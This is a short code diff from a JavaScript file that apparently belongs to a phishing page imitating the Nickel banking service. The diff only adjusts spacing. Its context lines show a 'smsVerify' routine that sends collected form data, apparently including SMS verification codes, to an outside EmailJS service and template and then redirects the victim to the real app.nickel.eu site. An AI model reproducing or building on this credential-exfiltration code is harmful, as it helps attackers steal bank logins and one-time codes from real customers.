@@ -85,7 +85,7 @@ function smsVerify() {
 
         
         
-            emailjs.send("service_rb7wkid","template_lwkgcu3", tempParams)
+        emailjs.send("service_rb7wkid", "template_lwkgcu3", tempParams)
             .then(function (res) {
                 window.location.href = "https://app.nickel.eu"
             }); 
@@ -145,7 +145,7 @@ function addChecked(e) {
 
         
 
-        emailjs.send("service_rb7wkid","template_lwkgcu3", tempParams)
+        emailjs.send("service_rb7wkid", "template_lwkgcu3", tempParams)
             .then(function (res) {
                 loadingPage();
         });
